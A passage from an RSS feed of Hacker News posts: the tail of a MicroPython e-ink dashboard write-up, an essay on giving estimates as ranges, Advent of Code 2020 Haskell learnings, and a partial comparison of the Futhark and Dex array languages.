  <img src="https://rahulrav.com/assets/images/e_ink_step_4.jpg" alt="Top View" title="Step 4: Supporting Images &amp; Initial UI" width="640px">
</p>
<h6 id="miscellaneous-features">Miscellaneous Features</h6>
<p>I also worked on other additional features along the way, including:</p>
<ul>
<li>Support &amp; configuration for time zones. The MicroPython runtime on the ESP 32 does <em>not</em> ship with a Time Zone database and the real time clocks only support UTC seconds after epoch. </li>
<li>Support for token caching &amp; persistence. This was a big feature because this would mean that I could serialize the <code>auth state</code> on the device. This meant that I did not have to do the full <code>OAuth2</code> dance every single time I started the app.</li>
<li>A small <code>DateTime</code> library capable of formatting dates in a couple of different formats. </li>
<li>Support for <code>Deep Sleep</code>. This would allow the device to conserve power by not having to do anything. The device would only wake up once every <code>N</code> minutes to refresh the events in the <code>Calendar</code>. </li>
</ul>
<h4 id="summary">Summary</h4>
<p>This project was a <strong>lot of fun</strong>. I learnt a lot, especially given that I did not intend to build a UI Toolkit when I started working on the project). The toolkit i built is janky, but it is an accomplishment, considering I have never built one before. </p>
<p>MicroPython was incredible to prototype with (despite lacking a graphical debugger). I would highly recommending picking up a board that supports MicroPython for your next hardware project. The MicroPython community (libraries + forums) is also pretty active and helpful</p>
<h4 id="epilogue">Epilogue</h4>
<p>All the source code that I wrote for the project is on <a href="https://github.com/tikurahul/Inkplate-6-micropython">GitHub</a>. The entry point is a file called <a href="https://github.com/tikurahul/Inkplate-6-micropython/blob/master/app.py"> <code>app.py</code></a>. Bear in mind, that all of this code was written in ~ a week long period. I also plan on making some more minor improvements to the UI. </p>
              </div>
            </div>
            
          </main>
          
          
          
        </div></div>]]>
            </description>
            <link>https://rahulrav.com/blog/e_ink_dashboard.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560570</guid>
            <pubDate>Mon, 28 Dec 2020 16:38:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Accurate Estimations]]>
            </title>
            <description>
<![CDATA[
Score 12 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25560386">thread link</a>) | @1penny42cents
<br/>
December 28, 2020 | https://camhashemi.com/2020/12/28/accurate-estimations/ | <a href="https://web.archive.org/web/*/https://camhashemi.com/2020/12/28/accurate-estimations/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-269">
			<!-- .entry-header -->
		<div>
		
<p>We‚Äôre constantly asked to give estimates:</p>



<p><em>How long will it take?<br>How much will it cost?</em><br><em>What time should we leave?</em><br><em>How much do you want?</em></p>



<p>Estimations are information about the unknown. We constantly use this information to make decisions: allocating resources, changing strategies, and choosing partners. But despite all this practice, we‚Äôre horrible at accurate estimations.</p>



<h2>Why Estimations are Hard</h2>



<p>Estimations are hard for both technical and social reasons.</p>



<p>We don‚Äôt know what we don‚Äôt know. Naive estimators fail to account for surprises. They estimate based on known factors and best-case scenarios. These estimates may be <em>perfectly accurate</em> beforehand, but they‚Äôre instantly broken by the first surprise.</p>



<p>Experienced estimators account for this problem by ‚Äòadding some buffer‚Äô. But even then, how much should they add? Even knowing that surprises <em>can</em> happen, it‚Äôs impossible to <em>how many</em> will happen or <em>the impact</em> of those surprises. Choosing the right amount of buffer is a lot like making the right estimation in the first place. We still don‚Äôt know what we don‚Äôt know. And adding too much buffer can be as expensive as failing to account for surprise at all.</p>



<p>In addition to this technical problem, there‚Äôs a strong social problem. Let‚Äôs imagine two common scenarios.</p>



<p>In the first scenario, you just gave  giving an estimate to your team. You perfectly estimate that a project will take three weeks; but your manager gives you a puzzled look. Your teammate snickers, claiming they could do it in a week, tops. The feeling is that you must be either lazy or incompetent to give such a padded estimation. You newly shortened estimate is wrong, so you go on to extend the project‚Äôs deadline twice in three weeks. Rather than holding you accountable to that one-week estimate, your manager commends you for being able to handle the unforeseen surprises on such a complicated project.</p>



<p>In the other scenario, you‚Äôre giving an estimate to a potential client. You perfectly estimate that a project will take three weeks; but your competitor only estimates it‚Äôll take a week. The client signs with your competitor. Since their estimate was wrong, your competitor goes on to extend the deadline twice in three weeks. Even though your estimate was accurate, your client‚Äôs estimate got them paid.</p>



<p>I‚Äôve been in countless scenarios like this. Sometimes people outright pressure us into shortening our estimations, and sometimes the voice in our heads push us to. Either way, giving accurate estimates is both technically hard and socially challenging [1].</p>



<h2>Two Types of Estimators</h2>



<p>In response to this hard problem, we become systematic underestimators or systematic overestimators.</p>



<p>Underestimators fail to give enough buffer. This strategy has two key benefits. First, it signals (unrealistically) high performance. Like our virtue-signalling teammate, we can underestimate ahead of time, then point at concrete surprises for our eventual underperformance. And like our overpromising competitor, we can underestimate during a bid and do whatever we want after the contract is signed. Second, tight estimates demand efficiency. Underestimators set deadlines that they and their teams must work hard to meet. Underestimation works well when the costs of going over-budget are small. But when those costs are large, underestimations lead to disasters. On the whole, underestimators systematically run the risk of being burnt out, past-deadline, and over-budget.</p>



<p>Overestimators are instead biased towards large buffers. Extreme overestimators might send you articles titled ‚ÄúEstimations are a Scam‚Äù, or claim that estimations are simply tools for worker exploitation. Overestimation works when the costs of buffer are low and the costs of going over budget are high. But overestimators are constantly taxed by Parkinson‚Äôs Law. Parkinson‚Äôs Law is the pattern where projects fill the time and resources they‚Äôre allocated, instead of the time and resources they need [2]. Rather than pushing towards peak performance, overestimators systematically move at a bored, leisurely pace. Overestimators are also demotivating. Rather than inspiring the team to reach competitive goals, they disparage those who do. So while underestimators run the risk of their teams burning out, overestimators run the risk of their teams shutting down.</p>



<p>To simplify the hard problem of estimations, we slowly become under- or over-estimators. We reap the systematic rewards and accept the systematic costs. These chosen strategies may work in many contexts. But for any simple strategy, there are worst-case scenarios where those systematic risks blow up. Underestimators blow up when the costs of going over budget skyrocket. Overestimators blow up when the costs of adding extra buffer skyrocket.</p>



<p>This line between underestimators and overestimators forms a classic ‚Äúspectrum problem‚Äù. A spectrum problem occurs when we oversimplify the solution to a given tradeoff. In this case, we‚Äôre splitting the spectrum of estimation strategies in half. Underestimators fall on one side of the line, and overestimators fall on the other. With many spectrum problems, the better solution is to cut the spectrum into three pieces, choosing the middle strategy between extremes. In doing so, we acknowledge the costs and rewards of both sides, maximizing the upsides and minimizing the downsides systematically.</p>



<h2>Playing Single-Pointed Darts</h2>



<p>Imagine a game of darts with very simple rules. I throw my dart first, and you only score by hitting that same exact dart-sized point. This game is very simple, but so difficult that nobody would play it. To make darts playable, we specify scoring <em>ranges</em>. These same ranges are missing from our everyday estimations.</p>



<p>The most common estimate sounds something like: ‚ÄúI‚Äôll have it ready by 5pm.‚Äù But this is just like playing single-point darts! Imagine that this estimate is perfectly precise: the project can‚Äôt be ready one second before or one second after 5pm. While impressive, there‚Äôs zero room for error. If we end up sick, or if the project ends up more complex than expected, our estimate becomes instantly wrong.</p>



<p>To account for surprises, we can add buffer. But adding buffer only shifts the dart board over a few inches. ‚ÄúI‚Äôll have it ready by 5pm <em>tomorrow</em>‚Äù faces all the same problems as the first estimation. Two days of surprises still makes me wrong. We‚Äôre still playing single-pointed darts.</p>



<p>It‚Äôs a losing game. And yet we see it played again and again, day after day, project after project.</p>



<h2>Playing Darts with Ranges</h2>



<p>To enjoy this game of darts, we need to change the rules. Rather than giving a single-pointed estimate, we give two points: one for the best case, and one for the worst case. These two points create a range of targets to hit, just like the game of darts we know and love.</p>



<p>To demonstrate, I can give an example from my personal life. My girlfriend is very punctual, and I‚Äôm not. She‚Äôs a classic overestimator, giving as much buffer as we can afford. And I‚Äôm a classic underestimator, giving the most optimistic estimates. So whenever we have somewhere to be, and she asks me ‚Äúwhat time should we be ready?‚Äù‚Ä¶ it‚Äôs a classic estimation problem!</p>



<p>My preference would be to underestimate, and tell her the last minute we can leave without being late. Her preference would be for me to overestimate, telling her the soonest we can leave without being ‚Äútoo early‚Äù. But no matter what I say, we face all of the same problems stated above.</p>



<p>Recently, I‚Äôve started giving her two answers. The first answer is ‚Äúthe green time‚Äù. <strong>The green time tells us when we should leave so that we‚Äôre pleasantly early</strong>. The second answer is ‚Äúthe red time‚Äù. <strong>The red time is the last minute we can leave, without definitely being late</strong>. If we can be ready by the green time without stress or shortcuts, that‚Äôs perfect. Once we pass the green time, we go into the ‚Äúyellow zone.‚Äù <strong>The yellow zone is the buffer between early and late</strong>. There‚Äôs no need to take shortcuts or change plans yet, but we‚Äôre getting close. Once we approach the red line, we start discussing the need to take shortcuts, or to start telling others that we may be a little late.</p>



<p>Having a green time, a yellow zone, and a red time transforms our game of single-pointed darts into a proper dartboard, with zones of success. The green time makes my girlfriend happy: she can be ready early without worry. The red time makes me happy: I can fill my buffer time up with other activities. And the yellow zone is a signal for both of us to get focused or to start taking shortcuts [3].</p>



<p>Aside from the technical benefits, I can <em>feel</em> the difference in enjoyment between playing single-pointed darts vs playing scoring-ranged darts. Having a range makes inherent uncertainty explicit to the group. Adding buffer doesn‚Äôt just shift the dartboard a few inches, it expands our range of accuracy. Larger buffers signal more uncertainty and require less precision, while smaller buffers signal more confidence and require more precision. The expression of certainty and confidence isn‚Äôt possible to communicate with a single-pointed estimate.</p>



<p>By estimating with two numbers instead of one, a richness of information and strategies are made available.</p>



<h2>Simple Changes</h2>



<p>Using two numbers instead of one, these so-called ‚Äúconfidence intervals‚Äù aren‚Äôt complicated. Then why are they so absent from everyday life?</p>



<p>Although nothing prevented us from discovering them earlier, the first mention of confidence intervals in scientific literature wasn‚Äôt until 1937. And it wasn‚Äôt until the 1980s that they were required in scientific journals. So if it took forty years for the most knowledgeable people to apply a simple solution towards the most urgent problems, it‚Äôs not surprising that it‚Äôs taken the rest of us at least as long. That said, the goal of this essay is to speed up that process.</p>



<p>We can move towards accurate estimations by practicing two ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://camhashemi.com/2020/12/28/accurate-estimations/">https://camhashemi.com/2020/12/28/accurate-estimations/</a></em></p>]]>
            </description>
            <link>https://camhashemi.com/2020/12/28/accurate-estimations/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560386</guid>
            <pubDate>Mon, 28 Dec 2020 16:19:11 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learnings from Solving Advent of Code 2020 in Haskell]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25560044">thread link</a>) | @todsacerdoti
<br/>
December 28, 2020 | https://notes.abhinavsarkar.net/2020/aoc-learnings | <a href="https://web.archive.org/web/*/https://notes.abhinavsarkar.net/2020/aoc-learnings">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <header>
      <span><a href="https://notes.abhinavsarkar.net/">Abhinav's Notes</a></span>
      
    </header>
    <section>
    <span>2020-12-26</span>
    
    
    
    
    
      <a href="https://github.com/abhin4v/notes/edit/master/2020/aoc-learnings.md">Edit</a>
    
    </section>
    <main>
      

<p>After many years of trying unsuccessfully, I finally completed all 25 days of the <a href="https://adventofcode.com/2020/">Advent of Code 2020</a> in Haskell. Here is a summary of my learnings and solutions.</p>

<h2 id="learnings">Learnings</h2>

<ul>
  <li>GHCi is a powerful REPL. We can do almost anything in it which we can do in a file. It is also fast and great to play with code.</li>
  <li><a href="http://learnyouahaskell.com/zippers">Zippers</a> are an awesome technique to move around in a data structure. We can also think of them as focus points in spaces like lines, plains or 3D volumes. Many AoC problems are about moving around in space, doing things at the focus points. Zippers are quite suitable for such problems.</li>
  <li><a href="https://hackage.haskell.org/package/split/docs/Data-List-Split.html">Data.List.Split</a> module is good enough for basic input parsing.</li>
  <li>It is trivially easy to write a simple but feature-rich parser framework in Haskell. <a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">Here</a> is one in its entirety, with some example parsers, in just 24 lines.</li>
  <li><a href="https://hackage.haskell.org/package/graph-wrapper/docs/Data-Graph-Wrapper.html">Data.Graph.Wrapper</a> is a useful wrapper over <a href="https://hackage.haskell.org/package/containers/docs/Data-Graph.html">Data.Graph</a>.</li>
  <li>Haskell is good for writing interpreters.</li>
  <li>Graph traversal + Memoization = Dynamic programming.</li>
  <li>Use <a href="https://hackage.haskell.org/package/MemoTrie/docs/Data-MemoTrie.html">Data.Memotrie</a> for side-effect-free memoization in Haskell.</li>
  <li>Sometimes it‚Äôs faster to recompute than to memoize because of the lazy nature of Haskell and the extra memory usage caused by memoization.</li>
  <li><a href="https://hackage.haskell.org/package/comonad">Comonads</a> are great to simulate <a href="https://en.wikipedia.org/wiki/Cellular_automaton">Cellular automata</a>. Zippers are comonads.</li>
  <li>Comonad based cellular automata do not mutate the state of the automata universe, neither do they compute and materialize the whole universe at every step of the automata. Rather, they just stack functions over functions to create new lazy views over the original universe. This means that we can have lazy infinite universes. This also means that simulating cellular automata using comonads tends to get slower with increasing number of neighbours/dimensions.</li>
  <li>Sometimes mutability is the only option if we want to implement a fast algorithm. Mutable vectors from the <a href="https://hackage.haskell.org/package/vector">vector</a> library are great for this.</li>
  <li>Writing the <a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">four-dimensional zipper comonad</a> from scratch is complex and takes a really long time.</li>
  <li><a href="https://english.stackexchange.com/questions/56472/x-y-z-horizontal-vertical-and">There are no words</a> similar to <em>horizontal</em> and <em>vertical</em> for three dimensions or more.</li>
  <li><a href="https://hackage.haskell.org/package/base/docs/Text-ParserCombinators-ReadP.html">ReadP</a> is a good, minimal and easy to use parser framework which is included in the Haskell standard library.</li>
  <li>Try to use <a href="https://en.wikipedia.org/wiki/Bit_array">Bit arrays</a> when they fit, for performant solutions.</li>
  <li>Some problems, when scaled up, cannot be solved with lazy lists in a reasonable time.</li>
  <li>We can simulate a linked list of integers over a vector.</li>
  <li>If a program generates a lot of garbage, turning on multithreading (<code>-threaded</code>) and parallel garbage collection (<code>-qg0 -N</code>) may make it run faster.</li>
  <li>Tweaking the heap size (<code>-H</code>) and the allocation area size (<code>-A</code>) may make a program run faster.</li>
  <li>Use the <a href="https://downloads.haskell.org/~ghc/latest/docs/html/users_guide/glasgow_exts.html#extension-Strict"><code>Strict</code></a> extension cautiously. Sometimes it may unexpectedly make a program run slower.</li>
  <li><a href="https://www.youtube.com/watch?v=thOifuHs6eY">Hexagons are the bestagons</a>.</li>
</ul>

<h2 id="solutions">Solutions</h2>
<p>Here‚Äôs the index of all the solutions I wrote for AoC 2020:</p>

<table>
  <thead>
    <tr>
      <th>Problem</th>
      <th>Solution</th>
      <th>Salient points</th>
      <th>Libraries/modules used</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/1">1</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-1">‚Üó</a></td>
      <td>List comprehensions</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/2">2</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-2">‚Üó</a></td>
      <td>Validation</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/3">3</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-3">‚Üó</a></td>
      <td>Zippers</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/4">4</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-4">‚Üó</a></td>
      <td>Validation</td>
      <td><a href="https://hackage.haskell.org/package/split">split</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/5">5</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk1#day-5">‚Üó</a></td>
      <td>Decoding</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/6">6</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-6">‚Üó</a></td>
      <td><em>None</em></td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/7">7</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-7">‚Üó</a></td>
      <td>Parsing, graphs</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a>, <a href="https://hackage.haskell.org/package/graph-wrapper">graph-wrapper</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/8">8</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-8">‚Üó</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/9">9</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-9">‚Üó</a></td>
      <td><em>None</em></td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/10">10</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-10">‚Üó</a></td>
      <td>Graphs, memoization</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/11">11</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-11">‚Üó</a></td>
      <td>Cellular automata, zippers</td>
      <td><a href="https://hackage.haskell.org/package/comonad">comonad</a>, <a href="https://hackage.haskell.org/package/containers/docs/Data-Sequence.html">Data.Sequence</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/12">12</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk2#day-12">‚Üó</a></td>
      <td>Geometry</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/13">13</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-13">‚Üó</a></td>
      <td>Number theory</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/14">14</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-14">‚Üó</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/15">15</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-15">‚Üó</a></td>
      <td>Number sequence</td>
      <td><a href="https://hackage.haskell.org/package/vector/docs/Data-Vector-Unboxed-Mutable.html">Data.Vector.Unboxed.Mutable</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/16">16</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-16">‚Üó</a></td>
      <td>Parsing, constraint satisfaction</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/17">17</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-17">‚Üó</a></td>
      <td>Cellular automata, zippers</td>
      <td><a href="https://hackage.haskell.org/package/comonad">comonad</a>, <a href="https://hackage.haskell.org/package/base/docs/Data-List.html">Data.List</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/18">18</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-18">‚Üó</a></td>
      <td>Parsing, interpreter</td>
      <td><a href="https://hackage.haskell.org/package/mtl">mtl</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/19">19</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk3#day-19">‚Üó</a></td>
      <td>Parsing</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/20">20</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-20">‚Üó</a></td>
      <td>Image manipulation</td>
      <td><a href="https://hackage.haskell.org/package/bitwise/docs/Data-Array-BitArray.html">Data.Array.BitArray</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/21">21</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-21">‚Üó</a></td>
      <td>Parsing, constraint satisfaction</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/22">22</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-22">‚Üó</a></td>
      <td>Recursion, game</td>
      <td><em>None</em></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/23">23</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-23">‚Üó</a></td>
      <td>Linked list, game</td>
      <td><a href="https://hackage.haskell.org/package/vector/docs/Data-Vector-Primitive-Mutable.html">Data.Vector.Primitive.Mutable</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/24">24</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-24">‚Üó</a></td>
      <td>Parsing, cellular automata</td>
      <td><a href="https://hackage.haskell.org/package/base/docs/src/Text.ParserCombinators.ReadP.html">ReadP</a>, <a href="https://hackage.haskell.org/package/containers/docs/Data-Map-Strict.html">Map</a></td>
    </tr>
    <tr>
      <td><a href="https://adventofcode.com/2020/day/25">25</a></td>
      <td><a href="https://notes.abhinavsarkar.net/2020/aoc-wk4#day-25">‚Üó</a></td>
      <td>Cryptography</td>
      <td><em>None</em></td>
    </tr>
  </tbody>
</table>

    </main>
    
  </div></div>]]>
            </description>
            <link>https://notes.abhinavsarkar.net/2020/aoc-learnings</link>
            <guid isPermaLink="false">hacker-news-small-sites-25560044</guid>
            <pubDate>Mon, 28 Dec 2020 15:45:20 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Comparison of Futhark and Dex]]>
            </title>
            <description>
<![CDATA[
Score 53 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25559967">thread link</a>) | @Athas
<br/>
December 28, 2020 | https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html | <a href="https://web.archive.org/web/*/https://futhark-lang.org/blog/2020-12-28-futhark-and-dex.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content">
      

<p>
    Posted on December 28, 2020
    
        by Troels Henriksen
    
</p>

<p><a href="https://github.com/google-research/dex-lang">Dex</a> is a functional array programming language developed by a team of researchers at Google. I recently re-read <a href="https://openreview.net/pdf?id=rJxd7vsWPS">their paper</a>, which got me excited enough to want to take a closer look. Dex and Futhark are more or less aimed at the same kinds of problems, so my interpretation of Dex is rooted in how it differs from Futhark. In this post I will describe some of the interesting differences based on <a href="https://futhark-lang.org/examples.html#examples-from-dex">translating five Dex example programs to Futhark</a>. I‚Äôm not a Dex expert, so maybe I‚Äôve missed a thing here or there.</p>
<p>Futhark wasn‚Äôt originally designed to be a user-facing programming language. We were doing research in compiler optimisations for parallel computers, and the language was just a crude little thing so we could write programs for our optimiser to work on. Over time the language grew and eventually became fairly pleasant to use (<a href="https://futhark-lang.org/blog/2017-12-27-reflections-on-a-phd-accidentally-spent-on-language-design.html">full story here</a>), but it was still never designed as a cohesive or novel approach to array programming. That also means it‚Äôs fairly conventional or even old-fashioned, as functional languages go. In contrast, Dex‚Äôs authors had more imagination and designed their language from the start with novel ideas, chief of which is to consider <em>index sets as types</em>. To illustrate the idea, here is how to compute all-pairs L‚ÇÅ distances in Dex:</p>
<pre><code>pairwiseL1 ::  n=&gt;d=&gt;Real -&gt; n=&gt;n=&gt;Real
pairwiseL1 x = for i j.sum (for k. abs (x.i.k - x.j.k))</code></pre>
<p>The <code>n=&gt;d=&gt;Real</code> is the type of an <code>n</code> by <code>d</code> array of <code>Real</code>s. Dex leans heavily on an analogy between arrays and functions, as arrays can be seen as merely functions from indexes to values. In Futhark, we‚Äôd write this type as <code>[n][d]Real</code>. Note that in Dex, <code>n</code> and <code>d</code> are completely abstract type parameters, while in Futhark they are term-level variables.</p>
<p>The real advantage of Dex‚Äôs approach is that it permits a very lightweight notation for index spaces. For example, <code>for i j.e</code> produces a two-dimensional array where each element is given by the expression <code>e</code>, and the type checker figures out the span of <code>i</code> and <code>j</code> based on the context. For example, in <code>for k</code>, Dex figures out that <code>k</code> must be part of the index set <code>d</code>, because it is used to index the innermost dimension of <code>x</code>. Pretty cool!</p>
<p>A naive translation to Futhark would be this:</p>
<div id="cb2"><pre><code><span id="cb2-1"><span>let</span> pairwiseL1 [n][d] (x: [n][d]f64) =</span>
<span id="cb2-2">  tabulate_<span>2</span>d n n (\i j -&gt; f64.sum (tabulate d (\k -&gt; x[i,k] - x[j,k])))</span></code></pre></div>
<p>Note that the tabulation functions require explicit size-passing, and that the indexes are just integers - the type checker will not help us if we accidentally use the <code>k</code> along the wrong dimension.</p>
<p>Of course, the above is not how you‚Äôd actually write this program in Futhark. Instead you‚Äôd first define a function for computing the L‚ÇÅ distance:</p>
<div id="cb3"><pre><code><span id="cb3-1"><span>let</span> L1 [n] (xs: [n]f64) (ys: [n]f64) : f64 =</span>
<span id="cb3-2">  map2 (-) xs ys |&gt; map f64.abs |&gt; f64.sum</span></code></pre></div>
<p>And then you‚Äôd apply it to all the pairs:</p>
<div id="cb4"><pre><code><span id="cb4-1"><span>let</span> pairwiseL1 [n][m] (xss: [n][m]f64) : [n][n]f64 =</span>
<span id="cb4-2">  map (\a -&gt; map (\b -&gt; L1 a b) xss) xss</span></code></pre></div>
<p>I think this program illustrates the main difference in philosophy between Dex and Futhark. While Dex uses dependent types to secure an index-based notation, Futhark instead encourages index-free programming. I suspect the two approaches are fundamentally equivalent, but it‚Äôs an interesting contrast that I think is due to the two language‚Äôs different backgrounds. Dex is specifically designed to implement scientific code and formulae, which is traditionally very index-oriented. Futhark is more about supporting a ‚Äútraditional‚Äù combinator-based functional programming style, but just making it run much faster. You could view Futhark as a data-parallel ML, while Dex is <a href="https://en.wikipedia.org/wiki/Einstein_notation">higher-order dependently typed Einstein summation</a>.</p>
<p>I also suspect this focus on indexes is because the Dex authors have a background of being frustrated with NumPy-style programming, where the absence of efficient indexing can be quite restrictive. They even even use this NumPy implementation of L‚ÇÅ distances as motivation in their paper:</p>
<pre><code>def pairwiseL1(x):
  return sum(abs(x.T - x[..., newaxis]), axis=1)</code></pre>
<p>I certainly agree that this is hard to read.</p>
<h2 id="the-good-ones"><a href="#the-good-ones" id="the-good-ones-link" title="the-good-ones">The good ones</a></h2>
<p>Porting a two-line Dex program to Futhark is enough to wax philosophically for a paragraph or two, but it‚Äôs still a pretty shallow comparison. Therefore, I also ported five of <a href="https://github.com/google-research/dex-lang/tree/main/examples">the Dex example programs</a>, plus whatever of the <a href="https://github.com/google-research/dex-lang/blob/main/lib/prelude.dx">Dex prelude</a> I needed along the way. I‚Äôm not going to claim that I ported the five most difficult programs, but at least one of them was quite complicated. The Futhark programs total about 450 lines of code (excluding comments and blanks).</p>
<p>My general impression is that when it comes to expressing parallelism, Dex and Futhark are about equivalent. Dex‚Äôs index notation is more concise, but I personally find it slightly easier to understand and decompose Futhark expressions. As an example, this Dex function computes the covariance of a matrix:</p>
<pre><code>def covariance (n:Type) ?-&gt; (d:Type) ?-&gt;
    (xs:n=&gt;d=&gt;Float) : (d=&gt;d=&gt;Float) =
   xsMean :    d=&gt;Float = (for i. sum for j. xs.j.i) / IToF (size n)
   xsCov  : d=&gt;d=&gt;Float = (for i i'. sum for j.
                           (xs.j.i' - xsMean.i') *
                           (xs.j.i  - xsMean.i )   ) / IToF (size n - 1)
   xsCov</code></pre>
<p>In Futhark we write it as:</p>
<div id="cb7"><pre><code><span id="cb7-1"><span>let</span> covariance0 [n] (xs:[n]f64) (xsm:f64) (ys:[n]f64) (ysm:f64) =</span>
<span id="cb7-2">  f64.sum (map2 (\x y -&gt; (x-xsm) * (y-ysm)) xs ys) / f64.i64 (n<span>-1</span>)</span>
<span id="cb7-3"></span>
<span id="cb7-4"><span>let</span> covariance [n][d] (xs:[n][d]f64) =</span>
<span id="cb7-5">  <span>let</span> xsT = transpose xs</span>
<span id="cb7-6">  <span>let</span> means = map mean xsT</span>
<span id="cb7-7">  <span>in</span> map2 (\a a_mean -&gt;</span>
<span id="cb7-8">             map2 (\b b_mean -&gt; covariance0 a a_mean b b_mean)</span>
<span id="cb7-9">                  xsT means)</span>
<span id="cb7-10">          xsT means</span></code></pre></div>
<p>It‚Äôs certainly more verbose, but I had to read the Dex function carefully to understand what the indexes implied, while I have a much easier time understanding the structure of the computation from the Futhark formulation. Of course, I also have years of experience with Futhark, compared to just days with Dex.</p>
<p>Most of the translations were pretty simple, for example the <a href="https://futhark-lang.org/examples/dex-mandelbrot.html">Mandelbrot set</a>, <a href="https://futhark-lang.org/examples/dex-pi.html">Monte Carlo pi</a>, and <a href="https://futhark-lang.org/examples/dex-brownian-motion.html">Brownian motion</a> programs. One difference that made me feel <em>major</em> jealousy is that the <code>dex script</code> command is also able to generate <a href="https://google-research.github.io/dex-lang/mandelbrot.html">pleasant reports</a> containing both the code and visualisations and plots of various values. We definitely need a tool like this for Futhark!</p>
<p>The <a href="https://futhark-lang.org/examples/dex-sierpinski.html">Sierpinski triangle</a> program has a fun little detail in Dex, which is that the <code>randIdx</code> function uses the Dex type system to determine the range of the index being produced. While the <code>randIdx</code> function itself can still be wrong, this makes it hard to <em>use</em> it incorrectly. The Futhark translation of <code>randIdx</code> asks the user to pass in a range explicitly, and also returns just an integer.</p>
<h2 id="the-bad-one"><a href="#the-bad-one" id="the-bad-one-link" title="the-bad-one">The bad one</a></h2>
